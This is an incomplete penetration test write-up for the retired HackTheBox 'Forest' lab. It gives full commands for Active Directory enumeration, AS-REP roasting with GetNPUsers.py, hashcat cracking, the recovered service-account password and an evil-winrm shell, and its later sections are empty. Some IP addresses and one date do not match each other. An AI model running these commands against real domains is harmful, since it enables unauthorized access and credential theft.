# HTB Forest - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-2-25

---

## 0. Lesson Learned



---

## 1. Executive Summary

An internal penetration test was conducted against the Windows Server 2016 Active Directory environment (HTB Forest). The objective was to identify vulnerabilities that would allow unauthorized access and privilege escalation to Domain Administrator level.

The assessment revealed a critical Active Directory misconfiguration involving Exchange-related security groups. An AS-REP roastable service account (`svc-alfresco`) was identified and cracked offline. Using valid credentials, further domain enumeration identified a privilege escalation path through:

- Account Operators group membership
- GenericAll rights over Exchange Windows Permissions
- WriteDACL over the domain object
- DCSync abuse

This chain ultimately allowed full domain compromise and extraction of NTLM hashes, including the Administrator account. The domain was fully compromised.

The environment is critically vulnerable due to improper group delegation and excessive domain-level privileges.

---

## 2. Scope

- **Target:** 10.129.241.116
- **Domain:** htb.local
- **Environment:** HackTheBox Forest (Retired Machine)
- **Testing Window:** 2026-2-19 to 2016-2-25
- **Objective:** Complete domain compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

Full TCP Port Scan:

```
nmap -p- -sCV 10.129.241.116 -T4 -oA forest_tcp -Pn
```

Key services identified:

- 53/tcp - DNS
- 88/tcp - Kerberos
- 389/tcp - LDAP
- 445/tcp - SMB
- 3268/tcp - Global Catalog LDAP
- 5985/tcp - WinRM

The host was confirmed as a Domain Controller for `htb.local`.

Anonymous SMB login was permitted:

```
smbclient -L //10.129.241.116 -N
```

Anonymous LDAP bind was successful:

```
ldapsearch -x -H ldap://10.129.241.116 -s base namingcontexts
```

Result:

```
DC=htb,DC=local
```

## 5. Enumeration

LDAP User Enumeration

```
ldapsearch -x -H ldap://10.129.141.116 -b "DC=htb,DC=local" "(objectClass=user)" sAMAccountName
```

Users identified:

- sebastien
- lucinda
- andy
- mark
- santi

User `svc-alfresco` was not visible via anonymous LDAP but was identified via RPC enumeration:

```
rpcclient -U "" -N 10.129.241.116

enumdomusers
```

Service account discovered:

- svc-alfresco

---

## 6. Initial Access

Kerberos pre-authentication was tested

```
kerbrute userenum -d htb.local --dc 10.129.241.116 users.txt
```

User `svc-alfresco` was found to not require pre-authentication.

AS-REP hash extracted:

```
GetNPUsers.py -no-pass -dc-ip 10.129.241.78 htb/svc-alfresco
```

Hash cracked using Hashcat (mode 18200):

```
hashcat -m 18200 asrep23.hash /usr/share/wordlists/rockyou.txt --force
```

Recovered credentials:

```
svc-alfresco : s3rvice
```

Clock skew corrected:

```
sudo ntpdate 10.129.241.116
```

WinRM login as svc-alfresco:

```
evil-winrm -i 10.129.241.116 -u svc-alfresco -p s3rvice
```

Successful low-level shell obtained.

---

## 7. Post-Exploitation

---

## 8. Privilege Escalation

---

## 9. Proof of Compromise

---

## 10. Findings & Recommendations

---

## 11. Appendix